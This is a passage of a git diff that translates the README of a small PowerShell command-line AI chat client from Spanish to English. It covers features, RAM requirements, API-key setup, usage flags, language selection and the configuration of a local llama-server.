@@ -1,219 +1,308 @@
+[Español](README.es.md) · **English**
+
 # PRC AI 2.0
 
-Cliente de chat para **OpenAI**, **xAI (Grok)** y modelos locales (**Ollama**
-y **llama-server** de llama.cpp) escrito en PowerShell puro para la consola de
-Windows. Sin dependencias externas: nada de curl, nada de Python, nada de Node.
-Un `AI` en cualquier CMD y a conversar.
+Chat client for **OpenAI**, **xAI (Grok)** and local models (**Ollama** and
+llama.cpp's **llama-server**) written in plain PowerShell for the Windows
+console. No external dependencies: no curl, no Python, no Node. Type `AI` in
+any CMD window and start talking.
 
-Es un proyecto personal pequeño: empezó como un puñado de scripts batch + gawk
-y esta versión 2.0 lo reescribe entero sobre PowerShell 5.1 con un núcleo HTTP
-propio (streaming SSE incluido). Se publica por si a alguien más le sirve.
+It is a small personal project: it started as a handful of batch + gawk
+scripts, and this version 2.0 rewrites it entirely on PowerShell 5.1 with its
+own HTTP core (SSE streaming included). It is published in case it is useful
+to someone else.
 
 ```
-C:\> AI "explica en una linea que es SSE"
-Server-Sent Events: el servidor manda texto por HTTP en fragmentos a medida
-que lo genera, y el cliente lo pinta segun llega.
+C:\> AI "explain in one line what SSE is"
+Server-Sent Events: the server sends text over HTTP in chunks as it
+generates it, and the client draws it as it arrives.
 ```
 
-**Video de presentación (2:13, narrado):**
-[PRC AI 2.0 en YouTube](https://www.youtube.com/watch?v=FhrSBxF6vFE). En
-él se ve el chat local, la búsqueda en internet, los comandos y consultas
-guardados, y cómo aprende de los documentos de un negocio y los olvida. Lo
-que sale en la terminal es salida real del programa. Cómo se hizo:
-[`docs/video/GUION.md`](docs/video/GUION.md).
+**Presentation video (2:09, narrated):**
+[PRC AI 2.0 on YouTube](https://www.youtube.com/watch?v=7vM_9QslKjo). It shows the local chat, internet search,
+saved commands and web queries, and how it learns from a coffee shop's
+documents and forgets them. What appears in the terminal is real program
+output, in English. There is also a
+[Spanish version](https://www.youtube.com/watch?v=FhrSBxF6vFE). How they were
+made: [`docs/video/GUION.md`](docs/video/GUION.md) (in Spanish).
 
-## Características
+## Features
 
-- **REPL interactivo con memoria**: la conversación se acumula y se envía
-  completa en cada turno. `/new` la vacía, `/save` la guarda en JSON.
-- **Modo una-respuesta** para tuberías: `AI "pregunta"` responde y sale.
-- **Entrada estándar como contexto**: `type notas.txt | AI "resume esto"`.
-- **Streaming token a token** con render incremental de Markdown y colores
-  ANSI (se desactivan solos al redirigir la salida).
-- **Filtro de `<think>`** para modelos de razonamiento locales: el bloque de
-  razonamiento no se muestra, aunque llegue partido entre fragmentos SSE.
-- **Busca en internet cuando hace falta**, sin abrir el navegador: el modelo
-  decide si la pregunta necesita datos actuales (dólar, clima, noticias...) y,
-  solo si la laptop tiene salida a internet, busca en DuckDuckGo, lee las
-  primeras páginas y contesta con eso, citando las fuentes. Ver «Buscar en
-  internet».
-- **Sabe lo que la laptop ya sabe**, sin internet: la hora y la fecha salen
-  del reloj del equipo, y la batería, la red (wifi, IP local, puerta de
-  enlace, DNS, si hay internet), Windows, el procesador, la memoria, los
-  discos y la gráfica se leen del propio equipo cuando se pregunta por ellos.
-  Ver «Datos de este equipo».
-- **Comandos de solo lectura que guardas tú**, pidiéndolo en la conversación:
-  «agrégame un comando para ver mi IP pública». El chat pregunta, propone el
-  comando, pide confirmación, lo prueba y enseña el resultado; desde entonces
-  «¿cuál es mi IP pública?» se contesta sola. Unas reglas fijas, no el
-  modelo, deciden si el comando es de solo lectura. Ver «Comandos guardados».
-- **Consultas web guardadas**: datos concretos de una página, en JSON.
-  «agrégame un comando para el último sorteo de la lotería de Nicaragua de
-  internet»: busca la página en DuckDuckGo, saca los datos y te los enseña
-  antes de guardarla. Desde entonces se lee de nuevo cada vez que preguntas.
-  Ver «Consultas web».
-- **Preferencias que se recuerdan** de una conversación a otra: «recuerda que
-  las cifras de dinero me las des en dólares». Las escribes tú y el modelo
-  las tiene delante en cada pregunta. Ver «Preferencias».
-- **Aprende de tus documentos**: «aprende de los documentos de D:\MiNegocio».
-  Lee una carpeta (Word, Excel, PowerPoint, PDF, OpenDocument, texto, CSV,
-  HTML, RTF) y desde entonces contesta con lo que dicen sobre tu negocio:
-  servicios, empleados, horarios, procedimientos, políticas... Dice de qué documento
-  sale cada dato, y si no viene, lo dice en vez de inventarlo. Todo se queda
-  en el equipo. Ver «Documentos» y, para el día a día, la
-  [guía de uso](docs/guia-documentos.md).
-- **Diagnóstico** con `AI -Check`: estado de clave y conectividad de los
-  proveedores sin gastar tokens.
-- **Local por defecto**: sin configurar nada habla con Gemma 4 E4B en el
-  llama-server de la propia laptop, sin clave y sin mandar la conversación a
-  la nube.
+- **Interactive REPL with memory**: the conversation builds up and is sent
+  in full on every turn. `/new` clears it, `/save` saves it as JSON.
+- **One-answer mode** for pipelines: `AI "question"` answers and exits.
+- **Standard input as context**: `type notes.txt | AI "summarize this"`.
+- **Token-by-token streaming** with incremental Markdown rendering and ANSI
+  colors (turned off automatically when the output is redirected).
+- **`<think>` filter** for local reasoning models: the reasoning block is not
+  shown, even when it arrives split across SSE chunks.
+- **Searches the internet when needed**, without opening the browser: the
+  model decides whether the question needs current data (exchange rates,
+  weather, news...) and, only if the laptop can reach the internet, searches
+  DuckDuckGo, reads the first pages and answers with that, citing the
+  sources. See "Searching the internet".
+- **Knows what the laptop already knows**, without internet: the time and
+  date come from the computer's clock, and the battery, the network (Wi-Fi,
+  local IP, gateway, DNS, whether there is internet), Windows, the processor,
+  memory, disks and graphics card are read from the computer itself when you
+  ask about them. See "This computer's data".
+- **Read-only commands that you save**, by asking in the conversation: "add a
+  command to see my public IP". The chat asks questions, proposes the
+  command, asks for confirmation, tests it and shows the result; from then
+  on "what's my public IP?" gets answered on its own. Fixed rules, not the
+  model, decide whether the command is read-only. See "Saved commands".
+- **Saved web queries**: specific data from a page, as JSON. "add a command
+  for the latest Nicaragua lottery draw from the internet": it finds the page
+  on DuckDuckGo, takes the data and shows it to you before saving the query.
+  From then on the page is read again every time you ask. See "Web queries".
+- **Preferences that are remembered** from one conversation to the next:
+  "remember to give me money figures in dollars". You write them and the
+  model has them in front of it on every question. See "Preferences".
+- **Learns from your documents**: "learn from the documents in
+  D:\MyBusiness". It reads a folder (Word, Excel, PowerPoint, PDF,
+  OpenDocument, text, CSV, HTML, RTF) and from then on answers with what they
+  say about your business: services, staff, opening hours, procedures,
+  policies... It says which document each fact comes from, and if a fact is
+  not there, it says so instead of making it up. Everything stays on the
+  computer. See "Documents" and, for day-to-day use, the
+  [usage guide](docs/documents-guide.md).
+- **Diagnostics** with `AI -Check`: key status and connectivity of the
+  providers without spending tokens.
+- **Local by default**: with nothing configured it talks to Gemma 4 E4B on
+  the laptop's own llama-server, with no key and without sending the
+  conversation to the cloud.
+- **In Spanish or in English**: the messages come out in one language or the
+  other, and what you type is understood in both. See "Language".
 
-Qué cambió en cada versión y por qué: [HISTORIAL.md](HISTORIAL.md).
+What changed in each version and why: [HISTORIAL.md](HISTORIAL.md) (in
+Spanish).
 
-## Requisitos
+## Requirements
 
 - Windows 10/11.
-- Windows PowerShell **5.1 o superior** (el que trae Windows; también funciona
-  en PowerShell 7).
-- Opcional: [PSReadLine](https://github.com/PowerShell/PSReadLine) para
-  historial persistente en el modo interactivo (viene de serie en Windows 10/11).
-- Para los proveedores locales: [Ollama](https://ollama.com) escuchando en
-  `http://localhost:11434`, y/o `llama-server` de
-  [llama.cpp](https://github.com/ggml-org/llama.cpp) en modo router en
-  `http://127.0.0.1:8080` (ver «Modelos locales con llama-server»).
+- Windows PowerShell **5.1 or later** (the one that comes with Windows; it
+  also works on PowerShell 7).
+- Optional: [PSReadLine](https://github.com/PowerShell/PSReadLine) for
+  persistent history in interactive mode (included with Windows 10/11).
+- For the local providers: [Ollama](https://ollama.com) listening on
+  `http://localhost:11434`, and/or `llama-server` from
+  [llama.cpp](https://github.com/ggml-org/llama.cpp) in router mode on
+  `http://127.0.0.1:8080` (see "Local models with llama-server").
 
-## Instalación
+### How much RAM you need
 
-1. Clona o descarga esta carpeta donde quieras, por ejemplo `D:\PRC CMD AI`.
-2. Añade esa carpeta al `PATH` (o crea un alias). Con eso, `AI` funciona desde
-   cualquier CMD.
-3. Guarda tu clave de API (ver siguiente sección).
+Measured on 2026-11-18 on the author's laptop (Intel Core i5-10300H, 4 cores
+and 8 threads, 31.8 GB of RAM, NVIDIA GTX 1650 with 4 GB of graphics
+memory), with Gemma 4 E4B (`gemma-4-e4b`, Q4_K_M: a 4.96 GB file and 7.5
+billion parameters counting the per-layer embeddings) served by llama-server
+with a 4096-token context:
 
-> **Nota sobre ExecutionPolicy**: `AI.bat` lanza PowerShell con
-> `-ExecutionPolicy Bypass`. Eso afecta **solo a ese proceso**: no cambia
-> ninguna directiva del sistema ni pide permisos de administrador.
+| | RAM | Graphics card memory (VRAM) | |
+| --- | --- | --- | --- |
+| llama-server without the model loaded | ~0.5 GB | — | measured |
+| llama-server with the model loaded and answering | ~3.5 GB | ~2.1 GB (went from 1.5 to 3.6 GB, out of 4) | measured |
+| The program (PowerShell with everything loaded) | ~105 MB | — | measured |
+| The model without a dedicated GPU, all in RAM | ~5.5–6 GB | — | estimated |
 
-## Configuración de claves
+The model takes about 5.6 GB between RAM and graphics memory; with a 4 GB
+GPU, about 3.5 GB of it lands in RAM. On that laptop it writes the answer at
+about 9 tokens per second (179 tokens) and reads a short prompt at about 21
+tokens per second.
 
-Las claves **no se guardan en ficheros** ni pasan por la línea de comandos.
-`tools/Set-AIKey.ps1` las pide con `Read-Host -AsSecureString` (no se ven al
-teclear, no quedan en el historial) y las escribe como variable de entorno de
-usuario en `HKCU\Environment`, en los ámbitos *User* y *Process*:
+- **With an NVIDIA GPU with 4 GB or more**, the minimum is 8 GB of RAM, and
+  it is tight: the model's ~3.5 GB plus Windows 11, with few other apps
+  open. With 16 GB it is comfortable.
+- **Without a dedicated GPU**, the whole model (~5.5–6 GB) goes in RAM: the
+  minimum is 16 GB, and it will be slower.
+- **Recommended** for smooth use: 16 GB of RAM and an NVIDIA GPU with 4 GB
+  or more.
+- **With only cloud providers** (OpenAI, xAI) the model does not run on the
+  PC: whatever Windows needs is enough.
+
+It has not been measured without a GPU (everything on the CPU) or on an 8 GB
+machine: the 8 GB minimum and the no-GPU figures are estimates, not
+measurements.
+
+## Installation
+
+1. Clone or download this folder wherever you like, for example
+   `D:\PRC CMD AI`.
+2. Add that folder to the `PATH` (or create an alias). With that, `AI` works
+   from any CMD window.
+3. Save your API key (see the next section).
+
+> **Note on ExecutionPolicy**: `AI.bat` starts PowerShell with
+> `-ExecutionPolicy Bypass`. That affects **only that process**: it does not
+> change any system policy or ask for administrator rights.
+
+## Setting up keys
+
+Keys **are not saved in files** and do not go through the command line.
+`tools/Set-AIKey.ps1` asks for them with `Read-Host -AsSecureString` (they
+are not shown as you type and do not stay in the history) and writes them as
+a user environment variable in `HKCU\Environment`, in the *User* and
+*Process* scopes:
 
 ```
-AI -SetKey OPENAI_API_KEY     # para OpenAI
-AI -SetKey XAI_API_KEY        # para xAI / Grok
+AI -SetKey OPENAI_API_KEY     # for OpenAI
+AI -SetKey XAI_API_KEY        # for xAI / Grok
 ```
 
-Para borrar una clave, desde la carpeta del proyecto:
+To delete a key, from the project folder:
 `powershell -ExecutionPolicy Bypass -File tools\Set-AIKey.ps1 -Name XAI_API_KEY -Remove`.
 
-Ollama y llama-server no necesitan clave. Si lanzas llama-server con
-`--api-key`, guárdala con `AI -SetKey LOCAL_AI_API_KEY`.
+Ollama and llama-server do not need a key. If you start llama-server with
+`--api-key`, save it with `AI -SetKey LOCAL_AI_API_KEY`.
 
-> **Precedencia de ámbitos**: el código lee primero el ámbito *User* (HKCU) y
-> solo si no existe cae al ámbito *Process*. Es deliberado (la clave guardada
-> con `-SetKey` se ve al instante, sin abrir consola nueva), pero significa
-> que un `$env:XAI_API_KEY = '...'` de sesión **no** tiene efecto si ya hay
-> una clave guardada en el registro. Bórrala con `-Remove` si quieres probar
-> con otra clave temporal.
+> **Scope precedence**: the code reads the *User* scope (HKCU) first and
+> only falls back to the *Process* scope if it does not exist. This is
+> deliberate (the key saved with `-SetKey` is seen right away, without
+> opening a new console), but it means that a session
+> `$env:XAI_API_KEY = '...'` has **no** effect if there is already a key
+> saved in the registry. Delete it with `-Remove` if you want to try another
+> key temporarily.
 
-## Uso
+## Usage
 
 ```
-AI                              modo interactivo (REPL con memoria)
-AI "que es un BOM UTF-8"        una respuesta y sale
-type informe.txt | AI "resume"  la entrada estandar entra como contexto
-type informe.txt | AI           sin pregunta: todo stdin es la pregunta
-AI "pregunta" -Provider gpt     elige proveedor (alias: gpt, grok, deepseek...)
-AI "pregunta" -Provider gemma   modelo local (Gemma 4 E4B)
-AI "pregunta" -Provider gemma3  modelo local mas rapido (Gemma 3 4B)
-AI "pregunta" -Provider qwen    modelo local mas capaz y mas lento (Qwen3 8B)
-AI "pregunta" -Provider gpt -m gpt-4o -Temp 0.2 -NoStream -Plain
-AI "pregunta" -NoWeb            sin buscar en internet
-AI "pregunta" -NoEquipo         sin leer datos de este equipo
-AI "pregunta" -NoComandos       sin usar los comandos guardados
-AI "pregunta" -NoDocumentos     sin usar las carpetas de documentos
-AI -Check                       diagnostico de los proveedores, internet, el equipo
-                                y los comandos guardados
-AI -Help                        ayuda completa
+AI                              interactive mode (REPL with memory)
+AI "what is a UTF-8 BOM"        one answer and exit
+type report.txt | AI "summarize"  standard input goes in as context
+type report.txt | AI            no question: all of stdin is the question
+AI "question" -Provider gpt     choose the provider (aliases: gpt, grok, deepseek...)
+AI "question" -Provider gemma   local model (Gemma 4 E4B)
+AI "question" -Provider gemma3  faster local model (Gemma 3 4B)
+AI "question" -Provider qwen    more capable and slower local model (Qwen3 8B)
+AI "question" -Provider gpt -m gpt-4o -Temp 0.2 -NoStream -Plain
+AI "question" -NoWeb            without searching the internet
+AI "question" -NoComputer       without reading this computer's data
+AI "question" -NoCommands       without using the saved commands
+AI "question" -NoDocuments      without using the document folders
+AI "question" -Lang en          messages in English (see "Language")
+AI -Check                       check the providers, the internet, the computer
+                                and the saved commands
+AI -Help                        full help
 ```
 
-Dentro del modo interactivo:
+Inside interactive mode:
 
-| Comando        | Efecto                          |
+| Command        | Effect                          |
 | -------------- | ------------------------------- |
-| `bye` / `exit` | salir                           |
-| `cls`          | limpiar pantalla                |
-| `/new`         | vaciar la memoria               |
-| `/model X`     | cambiar de modelo               |
-| `/provider X`  | cambiar de proveedor            |
-| `/save [ruta]` | guardar la conversación en JSON |
-| `/buscar X`    | buscar X en internet y contestar con lo encontrado |
-| `/web on|off` | dejar o no que el modelo busque solo |
-| `/equipo [X]`  | enseñar los datos de este equipo sin preguntar al modelo (X: `bateria`, `red`, `equipo`, `sistema`, `procesador`, `memoria`, `disco`, `grafica`) |
-| `/equipo on|off` | dejar o no que se lean los datos de este equipo al preguntar |
-| `agrégame un comando para ...` | guardar un comando conversando: el chat pregunta, propone, pide confirmación, lo prueba y enseña el resultado |
-| `/comando agregar N C` | lo mismo de una vez: revisar el comando `C` y guardarlo con el nombre `N` |
-| `/comando`     | lista de los comandos guardados |
-| `/comando N`   | ejecutar el comando guardado `N` y enseñar su salida, sin modelo |
-| `/comando quitar N` | borrarlo |
-| `/comando on|off` | dejar o no que el modelo use los comandos guardados |
-| `recuerda que ...` | guardar una preferencia para esta y las próximas conversaciones |
-| `/preferencias` | lista de las preferencias guardadas; `/preferencia agregar X` y `/preferencia quitar N` |
-| `aprende de los documentos de D:\MiNegocio` | leer una carpeta de documentos y contestar con lo que dicen |
-| `/documentos`  | las carpetas de documentos y lo leído; `/documentos buscar X` enseña de dónde saldría la respuesta |
-| `olvida lo de ...` | olvidar algo de los documentos (`/documentos olvidos` y `/documentos recordar N` lo deshacen) |
-| `/help`        | mostrar la ayuda                |
+| `bye` / `exit` | quit                            |
+| `cls`          | clear the screen                |
+| `/new`         | clear the memory                |
+| `/model X`     | change the model                |
+| `/provider X`  | change the provider             |
+| `/save [path]` | save the conversation as JSON   |
+| `/search X`    | search X on the internet and answer with what is found |
+| `/web on\|off` | let the model search on its own, or not |
+| `/computer [X]` | show this computer's data without asking the model (X: `battery`, `network`, `computer`, `system`, `processor`, `memory`, `disk`, `graphics`) |
+| `/computer on\|off` | let this computer's data be read when you ask, or not |
+| `/language en\|es` | change the language of the messages (it stays saved; see "Language") |
+| `add a command to ...` | save a command by chatting: the chat asks, proposes, asks for confirmation, tests it and shows the result |
+| `/command add N C` | the same in one go: check command `C` and save it with the name `N` |
+| `/command`     | list of the saved commands |
+| `/command N`   | run the saved command `N` and show its output, without the model |
+| `/command remove N` | delete it |
+| `/command on\|off` | let the model use the saved commands, or not |
+| `remember that ...` | save a preference for this and future conversations |
+| `/preferences` | list of the saved preferences; `/preference add X` and `/preference remove N` |
+| `learn from the documents in D:\MyBusiness` | read a folder of documents and answer with what they say |
+| `/documents`   | the document folders and what was read; `/documents search X` shows where the answer would come from |
+| `forget about ...` | forget something from the documents (`/documents forgotten` and `/documents restore N` undo it) |
+| `/help`        | show the help                   |
 
-Sin configurar nada, el proveedor es `gemma`: Gemma 4 E4B en el llama-server
-local (`http://127.0.0.1:8080`), sin clave y sin que nada salga de la laptop.
-Hace falta que ese servidor esté encendido, o elegir otro proveedor. Orden de
-precedencia del proveedor: opción `-Provider`, variable de entorno
-`AI_PROVIDER`, `settings.json` y, si no hay nada, `gemma`.
+With nothing configured, the provider is `gemma`: Gemma 4 E4B on the local
+llama-server (`http://127.0.0.1:8080`), with no key and with nothing leaving
+the laptop. That server needs to be running, or you need to choose another
+provider. Provider precedence: the `-Provider` option, the `AI_PROVIDER`
+environment variable, `settings.json` and, if there is nothing, `gemma`.
 
-La configuración por defecto (proveedor, modelo, instrucción de sistema) se
-puede fijar en `%LOCALAPPDATA%\PRC-CMD-AI\settings.json`:
+The default configuration (provider, model, system instruction) can be set
+in `%LOCALAPPDATA%\PRC-CMD-AI\settings.json`:
 
 ```json
-{ "provider": "xai", "model": "grok-4.3", "system": "Responde breve y al grano." }
+{ "provider": "xai", "model": "grok-4.3", "system": "Answer briefly and to the point." }
 ```
 
-También sirven las variables de entorno `AI_PROVIDER` (proveedor por defecto)
-y `AI_QUESTION` (la usa internamente `AI.bat` para pasar la pregunta intacta).
+The environment variables `AI_PROVIDER` (default provider) and `AI_QUESTION`
+(used internally by `AI.bat` to pass the question intact) also work.
 
-El `model` de `settings.json` va con su `provider`: si eliges otro proveedor
-con `-Provider` o `AI_PROVIDER`, se usa el modelo por defecto de ese proveedor.
-Para que el de por defecto sea otro modelo local: `{ "provider": "qwen" }`.
+The `model` in `settings.json` goes with its `provider`: if you choose
+another provider with `-Provider` or `AI_PROVIDER`, that provider's default
+model is used. To make another local model the default:
+`{ "provider": "qwen" }`.
 
-En el mismo fichero, `"web": false` apaga la búsqueda en internet,
-`"equipo": false` la lectura de los datos de este equipo y `"comandos": false`
-el uso de los comandos guardados.
+In the same file, `"web": false` turns off internet search, `"equipo": false`
+turns off reading this computer's data and `"comandos": false` turns off the
+saved commands. `"language": "en"` (or `"es"`) sets the language of the
+messages.
 
-## Proveedores soportados
+## Language
 
-| `-Provider` | Servicio             | Variable de clave | Modelo por defecto | Alias                         |
+The program's messages come out in Spanish or in English. The language is
+chosen in this order:
+
+1. the `-Lang es` or `-Lang en` option (`-Idioma` also works);
+2. the `AI_LANG` environment variable;
+3. `"language"` in `settings.json`;
+4. if there is none of that and the data folder
+   (`%LOCALAPPDATA%\PRC-CMD-AI`) already exists, Spanish: whoever was
+   already using it was using it in Spanish, which used to be the only
+   language;
+5. if it is the first time, the Windows display language: `es-*` is
+   Spanish, and anything else, English.
+
+In interactive mode, `/language en` (or `/lang en`, `/idioma en`) changes it
+right away and saves it in `settings.json` without touching the other keys.
+`/language` on its own says which one is active. With the factory system
+instruction, the model also answers in the chosen language; if you set your
+own with `-System` or in `settings.json`, yours wins.
+
+- **What you type is understood in both languages**, whichever language the
+  program is in: "yes" and "sí", "cancel" and "cancelar", "remember that..."
+  and "recuerda que...", "learn from the documents in X" and "aprende de los
+  documentos de X", "forget about X" and "olvida lo de X", "add a command
+  to..." and "agrégame un comando para...".
+- **The commands have Spanish names too**, and both forms always work:
+  `/search` is `/buscar`, `/computer` is `/equipo`, `/command add` is
+  `/comando agregar`, `/preference remove` is `/preferencia quitar`,
+  `/documents forget` is `/documentos olvidar`, `/documents cloud on` is
+  `/documentos nube on`... The full list is in `$AI_ORDENES` and
+  `$AI_SUBORDENES`, at the start of `bin/ai.ps1`. The options too:
+  `-NoComputer` is `-NoEquipo`, `-NoCommands` is `-NoComandos` and
+  `-NoDocuments` is `-NoDocumentos`.
+- In English the answer label is `ai >` instead of `ia >`, and `AI -Help`
+  comes out in English.
+- Changing the language does not force the documents to be read again,
+  except Excel files: in English their dates, times and currency come out as
+  in an English Excel (see "Documents"), so they are read again.
+
+## Supported providers
+
+| `-Provider` | Service              | Key variable      | Default model      | Aliases                       |
 | ----------- | -------------------- | ----------------- | ------------------ | ----------------------------- |
 | `openai`    | OpenAI               | `OPENAI_API_KEY`  | `gpt-4o-mini`      | `gpt`, `chatgpt`, `oai`       |
 | `xai`       | xAI                  | `XAI_API_KEY`     | `grok-4.3`         | `grok`, `x`                   |
-| `ollama`    | Ollama (local)       | *(no necesita)*   | `qwen3:4b`         | `deepseek`, `local`, `ds`     |
-| `gemma`     | llama-server (local) | *(no necesita)*   | `gemma-4-e4b`      | `gemma4`, `e4b`, `llama`, `llamacpp` |
-| `gemma3`    | llama-server (local) | *(no necesita)*   | `gemma-3-4b`       | |
-| `qwen`      | llama-server (local) | *(no necesita)*   | `qwen3-8b`         | `qwen3`                       |
+| `ollama`    | Ollama (local)       | *(not needed)*    | `qwen3:4b`         | `deepseek`, `local`, `ds`     |
+| `gemma`     | llama-server (local) | *(not needed)*    | `gemma-4-e4b`      | `gemma4`, `e4b`, `llama`, `llamacpp` |
+| `gemma3`    | llama-server (local) | *(not needed)*    | `gemma-3-4b`       | |
+| `qwen`      | llama-server (local) | *(not needed)*    | `qwen3-8b`         | `qwen3`                       |
 
-Todos hablan el mismo dialecto (`POST /v1/chat/completions`), así que
-añadir un proveedor compatible es añadir una entrada a la tabla de
-`lib/providers.ps1`. Nada más.
+They all speak the same dialect (`POST /v1/chat/completions`), so adding a
+compatible provider means adding an entry to the table in
+`lib/providers.ps1`. Nothing else.
 
-### Modelos locales con llama-server
+### Local models with llama-server
 
-`gemma`, `gemma3` y `qwen` son tres entradas que apuntan al **mismo** `llama-server` en
-modo router (`--models-preset fichero.ini`): un puerto, varios modelos.
+`gemma`, `gemma3` and `qwen` are three entries that point to the **same**
+`llama-server` in router mode (`--models-preset file.ini`): one port, several
+models.
 
-Para levantar el tuyo hace falta un llama.cpp reciente, con modo router (el
-autor usa la compilación b10209). Crea un fichero de modelos, por ejemplo
-`modelos.ini` (ASCII o UTF-8 sin BOM; cada clave es un argumento de
-`llama-server` sin los guiones; las rutas van sin comillas):
+To run your own you need a recent llama.cpp with router mode (the author
+uses build b10209). Create a models file, for example `models.ini` (ASCII or
+UTF-8 without BOM; each key is a `llama-server` argument without the dashes;
+paths go without quotes):
 
 ```ini
 version = 1
@@ -225,7 +314,7 @@ sleep-idle-seconds = 120
 
 [gemma-4-e4b]
 model = models\gemma-4-E4B-it-Q4_K_M.gguf
-; entero en la grafica hacen falta mas de 4 GB; con 4 GB, unas 32 capas
+; fully on the GPU it needs more than 4 GB; with 4 GB, about 32 layers
 n-gpu-layers = 99
 
 [gemma-3-4b]
@@ -237,831 +326,876 @@ model = models\Qwen3-8B-Q4_K_M.gguf
 reasoning-budget = 0
 ```
 
-y arranca el servidor desde la carpeta que contiene ese fichero y `models\`:
+and start the server from the folder that contains that file and `models\`:
 
 ```
-llama-server --models-preset modelos.ini --models-max 1 --host 127.0.0.1 --port 8080
+llama-server --models-preset models.ini --models-max 1 --host 127.0.0.1 --port 8080
 ```
 
-Los `.gguf` pueden ser otros: lo que tiene que coincidir con
-`lib/providers.ps1` es el nombre de cada sección.
+The `.gguf` files can be different ones: what has to match
+`lib/providers.ps1` is the name of each section.
 
-- El modelo se elige con el campo `model` de la petición, que tiene que
-  coincidir letra por letra con una sección del fichero de modelos
-  (`[gemma-4-e4b]`, `[gemma-3-4b]`, `[qwen3-8b]`). Con otro nombre el servidor contesta
+- The model is chosen with the `model` field of the request, which has to
+  match a section of the models file letter for letter (`[gemma-4-e4b]`,
+  `[gemma-3-4b]`, `[qwen3-8b]`). With another name the server answers
   `HTTP 400 -> model '...' not found`.
-- `AI` no arranca el servidor. Si no está en marcha, el error lo dice
-  (`nadie escucha en http://127.0.0.1:8080/v1`) y añade el texto de
-  `$AI_LLAMA_HINT`. El que viene en el repositorio es la orden del autor
-  (`pm2 start rpa-ai-portable`): cámbialo en `lib/providers.ps1` por la que
-  arranca tu servidor.
-- Con `--models-max 1` solo hay un modelo en memoria: la primera pregunta tras
-  cambiar de modelo tarda bastante más (de 11 a 18 s en el equipo del autor) y,
-  tras el reposo por inactividad, unos 5 s más.
-- Plazo de espera hasta que el servidor empieza a contestar: 300 s con `gemma` y `gemma3`
-  y 600 s con `qwen` (campo `Timeout` de `lib/providers.ps1`), porque antes de
-  la primera palabra el servidor puede tener que cargar o cambiar el modelo y
-  leer toda la entrada. En los demás proveedores son 30 s.
-- Si otro cliente del mismo servidor pide el otro modelo a la vez, una de las
-  dos preguntas puede cortarse o fallar con `HTTP 500 ... failed to load`. `AI`
-  lo dice (`la respuesta se corto`) y no reintenta sola: hay que repetir la
-  pregunta. En el modo una-respuesta sale con código 2; en el interactivo el
-  turno fallido se retira de la memoria y la sesión sigue.
-- Si en ese puerto hay un `llama-server` de un solo modelo (sin
-  `--models-preset`), el campo `model` no elige nada: contesta siempre con el
-  suyo, también a `-Provider qwen`. `AI -Check` lo delata
-  (`contesta, pero no ofrece 'qwen3-8b'`).
-- En el modo interactivo, `/provider qwen` cambia de modelo sin salir.
-- A `gemma3` no se le ofrecen herramientas (campo `Tools = $false` de
-  `lib/providers.ps1`): Gemma 3 4B no sabe pedirlas. Con `buscar_web` a la
-  vista no buscaba y contestaba como si lo hubiera hecho («Según búsqueda
-  web, el dólar está a 37 córdobas», inventado; 3 de 3 preguntas el
-  2026-11-15). Sin herramientas dice que no puede buscar. Con `gemma3` sigue
-  habiendo `/buscar X`, y los datos del equipo le llegan por el atajo (ver
-  «Datos de este equipo»).
-- `qwen` pide las respuestas sin razonamiento (`reasoning_budget_tokens = 0` en
-  cada petición, campo `Extra`): Qwen3 razona por defecto y `AI` no muestra ese
-  razonamiento, así que cada pregunta serían de 1 a 5 minutos en blanco
-  (medido en el equipo del autor).
-- El contexto lo fija el servidor. Con 4.096 tokens caben entradas de hasta
-  unos 3.000; si aparece `HTTP 400` en una charla larga, usa `/new`.
-- Otro puerto, otros nombres de modelo u otra orden de arranque:
-  `$AI_LLAMA_URL`, el campo `Model` y `$AI_LLAMA_HINT` en `lib/providers.ps1`.
-- `AI -Check` lee `/v1/models` y, en los proveedores locales, comprueba además
-  que el servidor ofrece el modelo de cada entrada. En modo router añade el
-  estado que da el servidor: `OK (loaded)`, `OK (loading)`, `OK (sleeping)` u
-  `OK (unloaded)`. Dice `contesta, pero no ofrece 'qwen3-8b'` si en ese puerto
-  hay un servidor de un solo modelo o con otros nombres, y `parado.` más el
-  texto de `$AI_LLAMA_HINT` si nadie escucha. No carga ni despierta ningún
-  modelo.
+- `AI` does not start the server. If it is not running, the error says so
+  (`nothing is listening at http://127.0.0.1:8080/v1`) and adds how to start
+  it: `Start the service:  ` plus the command in `$AI_LLAMA_HINT` (the
+  sentence is added by `Get-AIProviderHint`, in the language of the
+  messages). The command that comes in the repository is the author's
+  (`pm2 start rpa-ai-portable`): change it in `$AI_LLAMA_HINT`, in
+  `lib/providers.ps1`, to the one that starts your server.
+- With `--models-max 1` only one model is in memory: the first question
+  after switching models takes quite a bit longer (11 to 18 s on the
+  author's computer) and, after the idle sleep, about 5 s more.
+- Time limit until the server starts answering: 300 s with `gemma` and
+  `gemma3` and 600 s with `qwen` (the `Timeout` field in
+  `lib/providers.ps1`), because before the first word the server may have to
+  load or switch the model and read the whole input. For the other providers
+  it is 30 s.
+- If another client of the same server asks for the other model at the same
+  time, one of the two questions may be cut off or fail with
+  `HTTP 500 ... failed to load`. `AI` says so (`the answer was cut off`) and
+  does not retry on its own: you have to repeat the question. In one-answer
+  mode it exits with code 2; in interactive mode the failed turn is removed
+  from memory and the session goes on.
+- If there is a single-model `llama-server` on that port (without
+  `--models-preset`), the `model` field chooses nothing: it always answers
+  with its own, also for `-Provider qwen`. `AI -Check` gives it away
+  (`answers, but does not offer 'qwen3-8b'`).
+- In interactive mode, `/provider qwen` switches models without quitting.
+- `gemma3` is not offered tools (the `Tools = $false` field in
+  `lib/providers.ps1`): Gemma 3 4B does not know how to ask for them. With
+  `buscar_web` in view it did not search and answered as if it had ("According
+  to a web search, the dollar is at 37 córdobas", made up; 3 out of 3
+  questions on 2026-11-15). Without tools it says it cannot search. With
+  `gemma3` there is still `/search X`, and the computer's data reaches it
+  through the shortcut (see "This computer's data").
+- `qwen` asks for answers without reasoning (`reasoning_budget_tokens = 0`
+  in every request, the `Extra` field): Qwen3 reasons by default and `AI`
+  does not show that reasoning, so every question would mean 1 to 5 minutes
+  of blank screen (measured on the author's computer).
+- The context is set by the server. With 4,096 tokens, inputs of up to about
+  3,000 fit; if `HTTP 400` shows up in a long chat, use `/new`.
+- Another port, other model names or another start command: `$AI_LLAMA_URL`,
+  the `Model` field and `$AI_LLAMA_HINT` in `lib/providers.ps1`.
+- `AI -Check` reads `/v1/models` and, for the local providers, also checks
+  that the server offers each entry's model. In router mode it adds the
